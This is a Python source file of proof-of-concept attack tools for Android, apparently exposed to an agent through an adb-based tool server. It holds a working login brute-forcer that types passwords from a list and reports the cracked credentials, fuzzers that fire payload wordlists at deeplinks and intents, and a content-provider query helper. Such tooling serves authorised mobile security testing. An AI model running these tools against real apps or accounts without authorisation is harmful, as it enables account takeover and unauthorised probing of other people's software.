"""
tools_poc.py — Proof-of-concept tool implementations:
               bruteforce login, deeplink fuzzing, intent fuzzing,
               content provider queries.
"""

import time
from typing import Optional

from .adb_utils import run_adb, run_adb_shell
from .tools_ui import tool_send_intent


# ---------------------------------------------------------------------------
# Internal helper: quick UI dump used by PoC tools
# ---------------------------------------------------------------------------

def _ui_dump(device: Optional[str]) -> str:
    run_adb_shell("uiautomator dump /sdcard/_mcp_d.xml", device)
    time.sleep(0.3)
    out, _, _ = run_adb(["shell", "cat /sdcard/_mcp_d.xml"], device=device)
    run_adb_shell("rm /sdcard/_mcp_d.xml", device)
    return out


# ---------------------------------------------------------------------------
# PoC tools
# ---------------------------------------------------------------------------

def tool_poc_bruteforce(args: dict, device: Optional[str]) -> str:
    u, pwds = args["username"], args["passwords"]
    ux, uy  = args["username_coords"]
    px, py  = args["password_coords"]
    sx, sy  = args["submit_coords"]
    succ    = args["success_indicator"]
    fail    = args.get("failure_indicator", "")
    delay   = args.get("delay_seconds", 1.5)
    cap     = args.get("max_attempts", 20)
    log = [f"🔓 Login Bruteforce — user={u}  cap={cap}  delay={delay}s", "─" * 55]
    for i, pwd in enumerate(pwds[:cap]):
        log.append(f"\n[{i+1}] {pwd}")
        for cx, cy, val in [(ux, uy, u), (px, py, pwd)]:
            run_adb_shell(f"input tap {cx} {cy}", device);    time.sleep(0.25)
            run_adb_shell("input keyevent 277", device);       time.sleep(0.1)
            run_adb_shell("input keyevent 67", device);        time.sleep(0.1)
            e = val.replace(" ", "%s").replace("'", "\\'")
            run_adb_shell(f"input text '{e}'", device);        time.sleep(0.25)
        run_adb_shell(f"input tap {sx} {sy}", device)
        time.sleep(delay)
        ui = _ui_dump(device)
        if succ.lower() in ui.lower():
            log += [f"  ✅ SUCCESS — {pwd}", "═" * 55, f"  user={u}", f"  pass={pwd}"]
            return "\n".join(log)
        elif fail and fail.lower() in ui.lower():
            log.append("  ❌ confirmed fail")
        else:
            log.append("  ⚠️  no indicator")
    log.append(f"\n🏁 Done — no hit in {min(len(pwds), cap)} attempts.")
    return "\n".join(log)


def tool_poc_fuzz_deeplinks(args: dict, device: Optional[str]) -> str:
    tmpl  = args["uri_template"]
    wl    = args["wordlist"]
    succ  = args.get("success_indicator", "")
    delay = args.get("delay_seconds", 1.0)
    log   = [f"🔗 Deeplink Fuzzer — {tmpl}  ({len(wl)} payloads)", "─" * 55]
    hits  = []
    for i, p in enumerate(wl):
        uri = tmpl.replace("{FUZZ}", p)
        log.append(f"\n[{i+1}] {uri}")
        run_adb_shell(f"am start -a android.intent.action.VIEW -d '{uri}'", device)
        time.sleep(delay)
        if succ:
            ui = _ui_dump(device)
            if succ.lower() in ui.lower():
                log.append(f"  🎯 HIT: {p}")
                hits.append(uri)
            else:
                log.append("  ✗")
    log.append(f"\n🏁 Hits: {len(hits)}")
    log += [f"  • {h}" for h in hits]
    return "\n".join(log)


def tool_poc_intent_fuzzer(args: dict, device: Optional[str]) -> str:
    comp    = args["component"]
    action  = args["action"]
    key     = args["extra_key"]
    vals    = args["fuzz_values"]
    statics = args.get("static_extras", {})
    delay   = args.get("delay_seconds", 0.8)
    log = [f"📤 Intent Fuzzer — {comp}  key={key}", "─" * 55]
    for i, v in enumerate(vals):
        r = tool_send_intent({"action": action, "component": comp, "extras": {**statics, key: v}}, device)
        log.append(f"\n[{i+1}] {key}={v}\n  {r.splitlines()[0]}")
        time.sleep(delay)
    log.append("\n🏁 Done.")
    return "\n".join(log)


def tool_poc_query_provider(args: dict, device: Optional[str]) -> str:
    uri  = args["uri"]
    proj = args.get("projection", "*")
    sel  = args.get("selection", "")
    cmd  = f"content query --uri {uri} --projection {proj}"
    if sel:
        cmd += f" --where \"{sel}\""
    out, err, _ = run_adb_shell(cmd, device)
    lines = [f"🗄️ Provider Query — {uri}", f"  projection={proj}"]
    if sel:
        lines.append(f"  selection={sel}")
    lines.append("─" * 55)
    lines.append(out[:5000] if out else f"❌ {err}" if err else "(no output)")
    return "\n".join(lines)
